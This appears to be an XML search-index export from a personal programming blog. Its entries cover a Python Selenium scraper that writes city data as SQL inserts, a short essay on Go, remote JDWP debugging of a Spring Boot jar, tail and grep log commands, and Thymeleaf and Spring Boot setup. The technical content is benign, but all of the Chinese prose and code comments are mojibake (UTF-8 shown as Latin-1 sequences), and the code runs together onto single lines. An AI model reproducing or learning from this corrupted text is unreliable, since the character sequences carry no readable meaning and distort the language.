select.xpath('/html/body/div[2]/div[3]/ul/li') # æ‰“å¼€æŒ‡å®šæ–‡ä»¶ï¼Œå‡†å¤‡å°†è¯·æ±‚åˆ°çš„æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ä¸­ file = open(file_name, 'w') # éåŽ†æ‰€æœ‰çš„åŸŽå¸‚åˆ—è¡¨é›†åˆ for index, value in enumerate(content): # æå–å½“å‰åŸŽå¸‚åˆ—è¡¨ä¸­çš„aæ ‡ç­¾çš„åŸŽå¸‚é“¾æŽ¥ item = value.xpath('/html/body/div[2]/div[3]/ul/li[' + str(index) + ']/a/@href') for city_path in item: city_url = HOST_URL + city_path print('å½“å‰åŸŽå¸‚é“¾æŽ¥ï¼š' + city_url) try: # æ‰“å¼€Chromeæµè§ˆå™¨ï¼Œè‡ªåŠ¨åŒ–è®¿é—®åŸŽå¸‚é“¾æŽ¥ browser = webdriver.Chrome() browser.get(url=city_url) # æå–åŸŽå¸‚åç§°ã€åŸŽå¸‚è½¦ç‰Œä»£ç ã€åŸŽå¸‚id city_name = browser.find_element_by_xpath('/html/body/div[4]/div[1]/a/span').text car_num_pre = browser.find_element_by_xpath('//*[@id="txtAbbr"]').text + browser.find_element_by_xpath( '//*[@id="txtInitial"]').text city_id = browser.find_element_by_xpath('//*[@id="cityId"]').get_attribute('value') print('åŸŽå¸‚åç§°:' + city_name + ' è½¦ç‰Œä»£ç :' + car_num_pre + ' åŸŽå¸‚id:' + city_id) # å†™å…¥æ–‡ä»¶ file.writelines("insert into city_info ('city_name','car_num_pre','city_id') " + "values ('" + city_name + "','" + car_num_pre + "','" + city_id + "');\n") # åˆ·æ–°ç¼“å†²åŒºï¼Œå°†ç¼“å†²åŒºæ•°æ®å†™å…¥æ–‡ä»¶ï¼Œé˜²æ­¢ç¼“å†²åŒºæœ‰å¤§é‡å¾…å†™å…¥æ•°æ®æ—¶çªç„¶æ–­ç”µé€ æˆæ•°æ®ä¸¢å¤± file.flush() # å…³é—­æµè§ˆå™¨ browser.close() except: print('èŽ·å–åŸŽå¸‚ä¿¡æ¯æ—¶å‘ç”Ÿå¼‚å¸¸') continue # å…³é—­æ–‡ä»¶æµ file.close()if __name__ == '__main__': start_time = datetime.datetime.now() # èŽ·å–åŸŽå¸‚åç§°ã€è½¦ç‰Œä»£ç ã€åŸŽå¸‚idï¼Œå¹¶å†™å…¥æŒ‡å®šçš„sqlæ–‡ä»¶ä¸­ get_city_info("city_info.sql") end_time = datetime.datetime.now() print('æ€»ç”¨æ—¶:' + str((end_time - start_time).seconds) + 'ç§’') ç‚¹å‡»è¿è¡Œä¹‹åŽå°±å¯ä»¥æ”¾å¿ƒçš„å‡ºåŽ»çŽ©äº†ðŸ˜‹æŽ§åˆ¶å°è¿™è¾¹å¯¹æ¯ä¸ªé“¾æŽ¥çš„è®¿é—®æƒ…å†µåšäº†è¾“å‡ºï¼Œå¦‚æžœæœ‰å¼‚å¸¸ï¼ˆç½‘ç»œè¶…æ—¶ï¼‰å¯ä»¥ç­‰å…¨éƒ¨ç»“æŸåŽå•ç‹¬æŠŠå¼‚å¸¸çš„åŸŽå¸‚å†è·‘ä¸€è¾¹å³å¯ã€‚æœ€åŽè¾“å‡ºçš„SQLæ–‡ä»¶å¦‚ä¸‹å›¾ï¼š æ³¨ï¼š ä½¿ç”¨WebDriverå‰ï¼Œéœ€è¦å°†å¯¹åº”å¹³å°çš„webdriveré©±åŠ¨å¤åˆ¶åˆ°ç³»ç»ŸçŽ¯å¢ƒå˜é‡ä¸­ã€‚]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Golangé€ è½®å­]]></title>
    <url>%2F63d56522%2F</url>
    <content type="text"><![CDATA[é€ è½®å­æœ€å¥½çš„æ—¶é—´æ˜¯â€œåå¹´å‰â€ï¼Œå…¶æ¬¡æ˜¯çŽ°åœ¨ã€‚è®¡ç®—æœºå‘å±•çš„åŽ†ç¨‹ä¸­è¯žç”Ÿäº†å¾ˆå¤šç¼–ç¨‹è¯­è¨€ï¼Œæ¯ä¸ªè¯­è¨€éƒ½æœ‰å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œå°±åƒåƒé¥­ç”¨ç­·å­å–æ±¤ç”¨å‹ºå­ï¼Œä¸åŒçš„è¯­è¨€åœ¨ä¸åŒçš„é¢†åŸŸéƒ½å„æœ‰ç”¨é€”ã€‚æ— è®ºæ˜¯Pythonã€PHPã€è¿˜æ˜¯Javaã€Kotlinã€åŒ…æ‹¬NodeJSä»¥åŠç›®å‰æˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„å„ç§å¼€å‘å·¥å…·ã€æ“ä½œç³»ç»Ÿã€æ•°æ®åº“ã€å„ç§è¯­è¨€å®žçŽ°çš„æ¡†æž¶ï¼Œå½’æ ¹ç»“åº•ï¼Œä»–ä»¬çš„åº•å±‚éƒ½æ˜¯C/C++æ¥ç¼–å†™çš„ã€‚çŽ°å¦‚ä»Šï¼Œæˆ‘ä»¬æœ‰äº†å¯ä»£æ›¿çš„æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯Golangã€‚ åœ¨å­¦æ ¡çš„æ—¶å€™æˆ‘çš„èˆå‹æŽ¨èæˆ‘å­¦ä¹ Goï¼Œæˆ‘æµ…æ˜¾çš„å­¦äº†ä¸€äº›ï¼Œå¹¶æŽ¥è§¦äº†Goçš„webå¼€å‘æ¡†æž¶beegoï¼Œbeegoæ”¯æŒçƒ­ç¼–è¯‘ï¼Œå¯åŠ¨æ—¥å¿—è¾“å‡ºçš„logoå’ŒSpring Bootå¾ˆåƒã€‚å½“æ—¶çš„æ„Ÿè§‰æ˜¯è¿™ä¸ªè¯­è¨€å¾ˆç‚«é…·ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šç›´æŽ¥äº¤å‰ç¼–è¯‘å‡ºå…¶ä»–å¹³å°çš„å¯æ‰§è¡Œç¨‹åºã€‚ å½“æ—¶å¯¹Goå¹¶ä¸æ˜¯å¾ˆæ„Ÿå†’ï¼Œå› ä¸ºè¯­æ³•ç¡®å®žæ²¡ä»€ä¹ˆäº®ç‚¹ã€‚è‡ªä»Žå·¥ä½œä¹‹åŽå¼€å§‹å¤§é‡çš„ä½¿ç”¨Kotlinæ¥å¼€å‘webï¼Œæˆ‘å‘çŽ°è¿™ä¸¤ä¸ªè¯­è¨€å¤–è¡¨çš„è¯­æ³•éžå¸¸åƒï¼Œè¿™å¤§æ¦‚å°±æ˜¯ä¸€ä¸ªæ—¶ä»£æ‰€æµè¡Œçš„è¯­æ³•å§ã€‚ ä¸ºä»€ä¹ˆé€‰æ‹©ç”¨Goè€Œä¸æ˜¯å…¶ä»–ï¼Œå› ä¸ºGoçš„åç¨‹è°ƒåº¦åšçš„éžå¸¸æ£’ï¼Œå¤©ç”Ÿæ”¯æŒé«˜å¹¶å‘ï¼Œå·ç§°å¯ä»¥æ¦¨å¹²æœºå™¨æ€§èƒ½ã€‚å›½å†…æœ€å¤§çš„äº‘å­˜å‚¨æœåŠ¡å•†ä¸ƒç‰›ä»Žåˆ›ç«‹ä¹‹åˆå°±å…¨æ ˆåœ¨ä½¿ç”¨Goï¼Œæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„å„ç§æ•°æ®åº“å­˜å‚¨çš„ä¸€èˆ¬æ˜¯ç»“æž„åŒ–çš„æ•°æ®ï¼Œä½†æ˜¯åƒå›¾åƒè§†é¢‘ç­‰éžç»“æž„åŒ–çš„æ•°æ®æƒ³è¦åœ¨ç½‘ç»œä¸Šé«˜é€Ÿä¼ è¾“å’Œå­˜å‚¨å°±å¿…é¡»ç”¨C/C++è¿™ç§åº•å±‚çš„è¯­è¨€å¯¹ç½‘ç»œå’Œæ•°æ®è¿›è¡Œæ“ä½œï¼Œå¥½åœ¨Goå†…ç½®ç€å¼ºå¤§çš„ç½‘ç»œåº“ï¼Œå®žçŽ°ä¸€ä¸ªç®€å•çš„èµ„æºæœåŠ¡å™¨åªå˜å¾—å¾ˆç®€å•ï¼Œå¼€å‘äººå‘˜è¦åšçš„å°±æ˜¯æŠŠé€»è¾‘å†™æ¸…æ¥šï¼ŒGoå±è”½äº†C/C++å¯¹å†…å­˜æ‰‹åŠ¨ç®¡ç†çš„æ“ä½œï¼Œè¿™ä¸€ç‚¹å¾ˆåƒJavaã€‚ æˆ‘å‘çŽ°ä¼šKotlinåŽï¼Œå†™Goå˜åŠ¨å¾—å¿ƒåº”æ‰‹ï¼Œè¯­æ³•çš„å­¦ä¹ æˆæœ¬å˜å¾—æ¯”è¾ƒä½Žã€‚å¤§èƒ†å‡è®¾ä¸€ä¸‹ï¼Œå¦‚æžœç”¨Goå†™å‡ºäº†ä¸€ä¸ªç±»ä¼¼PHPè§£é‡Šå™¨çš„ç¨‹åºï¼Œç›´æŽ¥ç¼–è¯‘æˆå„ä¸ªå¹³å°çš„å¯æ‰§è¡Œç¨‹åºï¼Œé‚£ä¹ˆè‡ªå·±é©¬ä¸Šå°±å¯ä»¥æ‹¥æœ‰ä¸€ä¸ªè·¨å¹³å°çš„è„šæœ¬è¯­è¨€äº†ã€‚ å…ˆå†™ä¸€ä¸ªGoçš„HelloWorldmain.go12345import "fmt"func main() &#123; fmt.Println("Hello, Golang")&#125; å†™å®Œå¯ä»¥ç›´æŽ¥ go run main.go è¿è¡Œçœ‹æ•ˆæžœã€‚ä¹Ÿå¯ä»¥ç›´æŽ¥ go build main.go ç¼–è¯‘æˆäºŒè¿›åˆ¶çš„å¯æ‰§è¡Œç¨‹åºã€‚Kotlinå·¥ä½œä¹‹ä½™ï¼ŒPythonè‡ªåŠ¨åŒ–ä¹‹å¤–ï¼Œæˆ‘æœ€å–œæ¬¢çš„å°±æ˜¯Goè¯­è¨€äº†ã€‚æ‰“ç®—å…ˆç”¨Goå†™ä¸ªç®€å•çš„httpèµ„æºæœåŠ¡å™¨ã€‚æ­¤å¤„å…ˆæŒ–ä¸ªå‘ï¼Œæœ‰ç©ºå†æ¥åŸ‹ã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨è¿œç¨‹Debugæ¥åˆ†æžé—®é¢˜]]></title>
    <url>%2F7c9947ec%2F</url>
    <content type="text"><![CDATA[ç»å¸¸ä¼šé‡åˆ°è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œé¡¹ç›®éƒ¨ç½²åˆ°æµ‹è¯•æœåŠ¡å™¨ä¸Šï¼Œå½“æµ‹è¯•äººå‘˜æµ‹å‡ºä¸€äº›é—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è¿è¡Œæ—¥å¿—æ¥æŸ¥æ‰¾é—®é¢˜å¹¶è§£å†³ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„é—®é¢˜éƒ½å¯ä»¥é€šè¿‡æ—¥å¿—æ¥è§£å†³çš„ï¼Œæ¯”å¦‚è¦æŸ¥çœ‹ç”¨æˆ·è¯·æ±‚çš„å˜é‡å’Œå¯¹è±¡çš„ä¸€äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±éœ€è¦é€šè¿‡æ–­ç‚¹æ¥è°ƒè¯•æŸ¥çœ‹ã€‚æ­£å¸¸çš„æ–­ç‚¹ä¸€èˆ¬æ˜¯åœ¨æœ¬åœ°ï¼Œä½†å…¶å®žè¿œç¨‹æœåŠ¡å™¨çš„ç¨‹åºç”¨Debugæ¨¡å¼è¿è¡Œï¼Œç„¶åŽæœ¬åœ°è¿žæŽ¥ä¸ŠDebugç«¯å£ï¼Œç›´æŽ¥åœ¨æœ¬åœ°æ‰“æ–­ç‚¹è¿›è¡Œè¿œç¨‹è°ƒè¯•ä¹Ÿæœªå°ä¸å¯ã€‚ 1.å°†jaråŒ…éƒ¨ç½²åˆ°æœåŠ¡å™¨ï¼Œä½¿ç”¨debugæ¨¡å¼è¿è¡Œé¡¹ç›®ï¼Œå¹¶ä¸”æŒ‡å®šç«¯å£å·ä¸º50051java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar spring-boot-0.0.1-SNAPSHOT.jar &amp; æœåŠ¡ä»¥Debugæ¨¡å¼å¯åŠ¨ï¼ŒDebugç›‘å¬åœ¨5005ç«¯å£1Listening for transport dt_socket at address: 5005 2.ideaä¸­æ·»åŠ ä¸€ä¸ªRemoteï¼Œä¸»æœºåœ°å€å’Œç«¯å£å·å†™å¯¹åº”æœåŠ¡å™¨çš„ipåœ°å€å’ŒDebugç«¯å£å·Transport é€‰æ‹©Socketï¼Œ Debugger mode é€‰æ‹©Attach 3.ç‚¹å‡»debugæŒ‰é’®ï¼Œå°†ä¼šè¿žæŽ¥åˆ°è¿œç¨‹debugç«¯å£ï¼Œè¯·æ±‚å¯¹åº”çš„æŽ¥å£,æœ¬åœ°ä»£ç æ‰“ä¸Šæ–­ç‚¹å¯ä»¥çœ‹åˆ°ç”¨æˆ·è®¿é—®æœåŠ¡å™¨ä¸Šçš„æŽ¥å£ï¼Œæœ¬åœ°æ–­ç‚¹æˆåŠŸæ–­åˆ°ç”¨æˆ·è¯·æ±‚ï¼Œç„¶åŽå°±å¯ä»¥åˆ†æžé—®é¢˜äº†ã€‚]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨tailå‘½ä»¤æŸ¥çœ‹æ—¥å¿—]]></title>
    <url>%2F58c57a9%2F</url>
    <content type="text"><![CDATA[æ²¡æ­£å¼å·¥ä½œå‰ï¼Œå†™é¡¹ç›®çš„æ—¶å€™å¯¹å¯¹æ—¥å¿—è¾“å‡ºä¸æ€Žä¹ˆé‡è§†ï¼Œä¸€èˆ¬å‡ºé—®é¢˜éƒ½ç›´æŽ¥åŽ»åˆ†æžé—®é¢˜ç„¶åŽæ”¹ç¨‹åºã€‚ç›´åˆ°æ­£å¼å·¥ä½œåŽæ‰å‘çŽ°æ—¥å¿—éžå¸¸éžå¸¸éžå¸¸çš„é‡è¦ï¼ï¼ˆé‡è¦çš„è¯è¯´ä¸‰éï¼‰ï¼Œå½“çº¿ä¸Šç³»ç»Ÿæœ‰bugå‡ºé—®é¢˜çš„æ—¶å€™è¦å¿«é€Ÿå‡†ç¡®çš„ç¬¬ä¸€æ—¶é—´ç¡®å®šå¹¶æ‰¾å‡ºé—®é¢˜ï¼Œå¦‚æžœç›´æŽ¥åŽ»åˆ†æžä»£ç æ— å¼‚äºŽäººå·¥çš„å¤§æµ·æžé’ˆï¼Œç´¯æ­»éƒ½å¯èƒ½æ‰¾ä¸å‡ºé—®é¢˜ã€‚æ­£ç¡®çš„å§¿åŠ¿æ˜¯è¦å…ˆæ ¹æ®ä»€ä¹ˆæ—¶é—´æ®µæŠ¥çš„ä»€ä¹ˆé—®é¢˜ï¼Œä½¿ç”¨tailå‘½ä»¤å¿«é€Ÿè¿‡æ»¤å‡ºæ—¥å¿—ï¼Œæ‰¾å‡ºç”¨æˆ·ä¼ çš„ä»€ä¹ˆå‚æ•°ï¼ŒæŠ¥äº†ä»€ä¹ˆå¼‚å¸¸ï¼Œç„¶åŽå¯¹åº”åŽ»è§£å†³ã€‚ -f ä»¥ç›‘å¬æ–‡ä»¶çš„æ–¹å¼æŸ¥çœ‹æ—¥å¿—å®žæ—¶è¾“å‡º ï¼ˆåˆå§‹æ˜¾ç¤ºæœ€åŽ10æ¡æ—¥å¿—ï¼‰1tail -f spring.log é€šè¿‡ -n åŠ ä¸Šè¦æŸ¥çœ‹çš„æ¡æ•°1tail -f -n 9999 spring.log ä¸ä½¿ç”¨ -f ç›‘å¬æ¨¡å¼1tail -f -n 9999 spring.log æŸ¥æ‰¾æœ€è¿‘9999æ¡æ—¥å¿—è®°å½•ï¼Œå¹¶ä½¿ç”¨grepç®¡é“å‘½ä»¤ è¿‡æ»¤å‡ºåŒ…å«â€™2018-05-30 22:30â€™çš„æ—¥å¿—ä¿¡æ¯1tail -n 9999 spring.log | grep '2018-05-30 22:30' æŸ¥æ‰¾æœ€è¿‘9999æ¡æ—¥å¿—è®°å½•ï¼Œå¹¶ä½¿ç”¨grepç®¡é“å‘½ä»¤ è¿‡æ»¤å‡ºåŒ…å«â€™ç”¨æˆ·ç­¾åï¼šâ€™çš„æ—¥å¿—ä¿¡æ¯1tail spring.log | grep 'ç”¨æˆ·ç­¾åï¼š' é€†åºæ˜¾ç¤ºæœ€åŽ10æ¡æ—¥å¿—1tail -r -n 10 spring.log]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åœ¨Spring Booté¡¹ç›®ä¸­ä½¿ç”¨Thymeleafæ¨¡æ¿å¼•æ“Ž]]></title>
    <url>%2F3714542b%2F</url>
    <content type="text"><![CDATA[Thymeleafæ˜¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“Žï¼Œå®˜æ–¹ä¸æŽ¨èåœ¨Spring Booté¡¹ç›®ä¸­ä½¿ç”¨jspæ¥ä½œä¸ºæ¨¡æ¿å¼•æ“Žï¼Œæœ€ä¸»è¦çš„åŽŸå› æ˜¯jspçš„å†™æ³•ä¸åˆ©äºŽå‰ç«¯å¼€å‘ã€‚Spring Bootå®˜æ–¹æŽ¨èä½¿ç”¨Thymeleafä½œä¸ºæ¨¡æ¿å¼•æ“Žï¼Œåœ¨å‰ç«¯å·¥å…·Vueå’ŒReactå¤§è¡Œå…¶é“çš„ä»Šå¤©ï¼Œä½¿ç”¨æ¨¡æ¿å¼•æ“Žæ¥æ¸²æŸ“ä¾ç„¶æœ‰å®ƒçš„ç”¨æ­¦ä¹‹åœ°ï¼ŒThymeleafç®€æ´å¹²ç»ƒçš„è¡¨è¾¾å¼æˆä¸ºæ¨¡æ¿å¼•æ“Žä¸­çš„ä¸€è‚¡æ¸…æµã€‚ å¿«é€Ÿä¸Šæ‰‹1.å¼•å…¥ä¾èµ–1compile('org.springframework.boot:spring-boot-starter-thymeleaf') 2.é…ç½®applicatio.yml(å¯é€‰)Spring Booté»˜è®¤ä¸ºå¼€å‘è€…åšäº†é…ç½®ï¼Œæ¨¡æ¿å‰ç¼€åœ¨èµ„æºç›®å½•çš„templatesç›®å½•ä¸‹ï¼ŒåŽç¼€é»˜è®¤ä¸º.html,å¼€å‘è€…é»˜è®¤å¯ä»¥æ— éœ€åšä»»ä½•çš„é…ç½® 3.ç¼–å†™æŽ§åˆ¶å™¨12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * ç”¨æˆ·ä¿¡æ¯æŽ§åˆ¶å™¨ * @author è“å£«é’¦ */@Controller@RequestMapping("/user")public class UserController &#123; /** * èŽ·å–ç”¨æˆ·ä¿¡æ¯ * @param model è§†å›¾æ¨¡åž‹ * @return æ¨¡æ¿åç§° */ @GetMapping public String getUser(Model model)&#123; // å®žä¾‹åŒ–ä¸€ä¸ªç”¨æˆ·ä¿¡æ¯å¯¹è±¡ï¼Œå¹¶è®¾ç½®å¯¹è±¡å±žæ€§å€¼ User user = new User(); user.setName("è“å£«é’¦"); user.setSex("ç”·"); user.setAge(23); // å®žä¾‹åŒ–ä¸€ä¸ªé›†åˆï¼Œå¹¶æ·»åŠ é›†åˆå…ƒç´  List&lt;Object&gt; stringList = new ArrayList&lt;&gt;(10); stringList.add(1); stringList.add(3.1415926); stringList.add(99999999L); stringList.add(null); stringList.add("Java"); // å®žä¾‹åŒ–ä¸€ä¸ªHashMapï¼Œå¹¶æ·»åŠ Mapå…ƒç´  Map&lt;String,Object&gt; objectMap = new HashMap&lt;&gt;(10); objectMap.put("å§“å","è“å£«é’¦"); objectMap.put("æ€§åˆ«","ç”·"); objectMap.put("å¹´é¾„",23); // é€šè¿‡è§†å›¾æ¨¡åž‹çš„æ–¹æ³•ï¼Œå‘æ¨¡æ¿å¼•æ“Žä¼ é€’ç”¨æˆ·ä¿¡æ¯å¯¹è±¡ model.addAttribute("userInfo",user); // é€šè¿‡è§†å›¾æ¨¡åž‹çš„æ–¹æ³•ï¼Œå‘æ¨¡æ¿å¼•æ“Žä¼ é€’ArrayListå¯¹è±¡ model.addAttribute("strList",stringList); // é€šè¿‡è§†å›¾æ¨¡åž‹çš„æ–¹æ³•ï¼Œå‘æ¨¡æ¿å¼•æ“Žä¼ é€’HashMapå¯¹è±¡ model.addAttribute("objectMap",objectMap); // é€šè¿‡è§†å›¾æ¨¡åž‹çš„æ–¹æ³•ï¼Œå‘æ¨¡æ¿å¼•æ“Žä¼ é€’å­—ç¬¦ä¸² model.addAttribute("info","ç”¨æˆ·ä¿¡æ¯"); // é€šè¿‡è§†å›¾æ¨¡åž‹çš„æ–¹æ³•ï¼Œå‘æ¨¡æ¿å¼•æ“Žä¼ é€’æ•°å€¼ç±»åž‹ model.addAttribute("number",1314520); // è¿”å›žæ¨¡æ¿åç§° return "userTpl"; &#125;&#125; 4.ç¼–å†™htmlæ¨¡æ¿åœ¨resources/templates/ç›®å½•ä¸‹æ–°å»ºuserTpl.html1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title th:text="$&#123;info&#125;"&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;ç”¨æˆ·ä¿¡æ¯å¯¹è±¡&lt;/p&gt;&lt;ul&gt; &lt;li th:text="$&#123;userInfo.name&#125;"&gt;&lt;/li&gt; &lt;li th:text="$&#123;userInfo.sex&#125;"&gt;&lt;/li&gt; &lt;li th:text="$&#123;userInfo.age&#125;"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;hr&gt;&lt;p&gt;ArrayListå¯¹è±¡&lt;/p&gt;&lt;ul th:each="item : $&#123;strList&#125;"&gt; &lt;li th:text="$&#123;item&#125;"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;hr&gt;&lt;p&gt;HashMapå¯¹è±¡&lt;/p&gt;&lt;ul th:each="item : $&#123;objectMap&#125;"&gt; &lt;li th:text="$&#123;item&#125;"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;hr&gt;&lt;p&gt;å­—ç¬¦ä¸²ä¿¡æ¯&lt;/p&gt;&lt;span th:text="$&#123;info&#125;"&gt;&lt;/span&gt;&lt;hr&gt;&lt;p&gt;æ•°å€¼ä¿¡æ¯&lt;/p&gt;&lt;span th:text="$&#123;number&#125;"&gt;&lt;/span&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; å¼•å…¥staticé™æ€èµ„æºç›®å½•ä¸‹çš„jså’Œcss1234&lt;!--å¼•å…¥js--&gt;&lt;script th:src="@&#123;js/vue.js&#125;"&gt;&lt;/script&gt;&lt;!--å¼•å…¥css--&gt;&lt;link rel="stylesheet" th:href="@&#123;/css/bootstrap.css&#125;"/&gt; åœ¨jsä¸­å–å€¼123&lt;script th:inline="javascript"&gt; var info =[[$&#123;info&#125;]];&lt;/script&gt; è¯¦ç»†çš„è¯­æ³•ç§»æ­¥å®˜æ–¹ç½‘ç«™ https://www.thymeleaf.org/]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Spring Bootå¼€å‘åº”ç”¨ç¨‹åº]]></title>
    <url>%2Fe31a6908%2F</url>
    <content type="text"><![CDATA[Spring Bootæ˜¯ä¸€ä¸ªå¼€å‘æ¡†æž¶ï¼Œç”¨æ¥å¿«é€Ÿå¼€å‘å„ç§åº”ç”¨ç¨‹åºï¼Œç›®å‰ç”¨çš„æœ€å¤šçš„ä¸»è¦æ˜¯åŽç«¯æœåŠ¡çš„å¼€å‘ã€‚Spring Bootä½¿ç”¨ç‰¹å®šçš„æ–¹å¼å¯¹Springçš„æ¨¡æ¿åŒ–é…ç½®è¿›è¡Œäº†ç®€åŒ–ï¼Œå¹¶ä¸”é›†æˆå¾ˆå¤šç¬¬ä¸‰æ–¹åº“çš„é»˜è®¤é…ç½®ã€‚é»˜è®¤å†…ç½®äº†Tomcatå®¹å™¨å¹¶ä¸”å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–å®¹å™¨ï¼Œæ— éœ€éƒ¨ç½²Waræ–‡ä»¶ï¼Œå¯ä»¥ç›´æŽ¥æ‰“æˆjaråŒ…ç‹¬ç«‹è¿è¡Œã€‚Spring Bootä¾èµ–äºŽSpringå®¶æ—çš„ç”Ÿæ€åœˆï¼Œä½ èƒ½æƒ³åˆ°çš„åŠŸèƒ½éƒ½åº”æœ‰å°½æœ‰ï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ï¼šæ–¹ä¾¿å’Œå¿«æ·ã€‚ ä¸€ã€Spring Bootçš„ä¸»è¦ç‰¹ç‚¹ å¯ä»¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªå¯ç‹¬ç«‹è¿è¡Œçš„Springç¨‹åº é»˜è®¤å†…ç½®åµŒå…¥çš„Tomcatï¼Œä¸éœ€è¦æ‰“åŒ…æˆWaråŒ…ä¾èµ–å¤–éƒ¨å®¹å™¨éƒ¨ç½²ï¼Œå¯ä»¥ç›´æŽ¥æ‰“æˆjaråŒ…ç‹¬ç«‹è¿è¡Œã€‚ ä½¿ç”¨Mavenæˆ–Gradleè¿›è¡Œç¬¬ä¸‰æ–¹åº“ç®¡ç†ï¼Œå¹¶ä¸”åšäº†ç®€åŒ–ã€‚é€šè¿‡å¼•å…¥starteræ‹¥æœ‰Springçš„å…¨éƒ¨åŠŸèƒ½ï¼Œå¼€ç®±å³ç”¨ã€‚ æ”¯æŒè‡ªåŠ¨é…ç½®ï¼Œå¯¹å¾ˆå¤šç¬¬ä¸‰æ–¹åº“æä¾›é»˜è®¤é…ç½®ï¼Œé‡‡ç”¨äº†â€œé»˜è®¤å¤§äºŽé…ç½®â€çš„æ–¹å¼ï¼Œå¯ä»¥åšåˆ°é›¶é…ç½®ã€‚ ä½¿ç”¨.yml .properties .xmlå¯¹é¡¹ç›®è¿›è¡Œé…ç½®ï¼Œé€šè¿‡ä¸åŒçš„æ–‡ä»¶äºŒçº§åç§°å¯ä»¥æ–¹ä¾¿çš„åœ¨ç”Ÿäº§å’Œå¼€å‘çŽ¯å¢ƒåˆ‡æ¢ã€‚ ä»Žæˆ‘å¼€å§‹ä½¿ç”¨Spring Bootæ—¶å·²ç»æ˜¯1.5.6çš„ç‰ˆæœ¬äº†ï¼Œåˆ°ç›®å‰ä¸ºæ­¢Spring Bootå·²ç»å‘å¸ƒäº†2.0.2ç‰ˆæœ¬ã€‚ä¹‹å‰æ¯”è¾ƒå¿™ï¼Œæ²¡æœ‰å¤ªå¤šç²¾åŠ›åŽ»è®°å½•ï¼ŒçŽ°åœ¨ä½¿ç”¨Spring Boot 2.0ç‰ˆæœ¬æ¥è®°å½•å­¦ä¹ è¿‡ç¨‹ã€‚2.0çš„ç‰ˆæœ¬å¤šäº†å¾ˆå¤šæ–°ç‰¹æ€§ï¼Œæœ€å¤§çš„äº®ç‚¹ä¸»è¦æ˜¯Spring Framework 5.0çš„å“åº”å¼ç¼–ç¨‹ã€‚æœ‰å…³Spring Boot 2.0çš„æ–°ç‰¹æ€§å°±ä¸å†è¯¦ç»†çš„ä»‹ç»ï¼Œå¯ä»¥æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ äºŒã€å¼€å§‹ä½¿ç”¨Spring Bootä½¿ç”¨Spring Bootåˆ°åº•æœ‰å¤šç®€å•ï¼Ÿ 1.ä½¿ç”¨Gradleæ¥æž„å»ºä¸€ä¸ªæ™®é€šçš„Javaé¡¹ç›®å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„Appç±»ä¸­æœ‰ä¸€ä¸ªå…¥å£mainå‡½æ•°ï¼Œåœ¨å‡½æ•°ä¸­æ‰“å° â€œHello,World!â€ã€‚ç‚¹å‡»è¿è¡Œå°±å¯ä»¥çœ‹åˆ°è¾“å‡ºã€‚æŽ¥ä¸‹æ¥é€šè¿‡å¼•å…¥ä¸€ä¸ªSpring Bootçš„ä¾èµ–ï¼Œå®žçŽ°é›¶é…ç½®çš„Springç¨‹åºã€‚ 2.åœ¨é¡¹ç›®çš„build.gradleæ–‡ä»¶ä¸­åŠ å…¥Spring Bootçš„webæ¨¡å—ä¾èµ–1compile("org.springframework.boot:spring-boot-starter-web:2.0.2.RELEASE") 3.ä¸ºå…¥å£ç±»æ·»åŠ @SpringBootApplicationæ³¨è§£ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªSpring Bootåº”ç”¨ç¨‹åºï¼Œç„¶åŽåœ¨mainå‡½æ•°ä¸­æ·»åŠ SpringApplication.runæ–¹æ³•ï¼Œä¼ å…¥å¯åŠ¨ç±»å…¥å£å‚æ•°ã€‚1234567@SpringBootApplicationpublic class App &#123; public static void main(String[] args) &#123; SpringApplication.run(App.class,args); &#125;&#125; é€šè¿‡ä»¥ä¸Šä¸‰ä¸ªæ­¥éª¤ï¼Œå°±å¯ä»¥ç›´æŽ¥å¯åŠ¨Spring Bootç¨‹åºäº†ã€‚ç‚¹å‡»è¿è¡Œï¼ŒæŽ§åˆ¶å°è¾“å‡ºäº†å¯åŠ¨æ—¥å¿—ï¼Œå…¶ä¸­å¯ä»¥çœ‹åˆ°ä¸€æ¡æ—¥å¿— 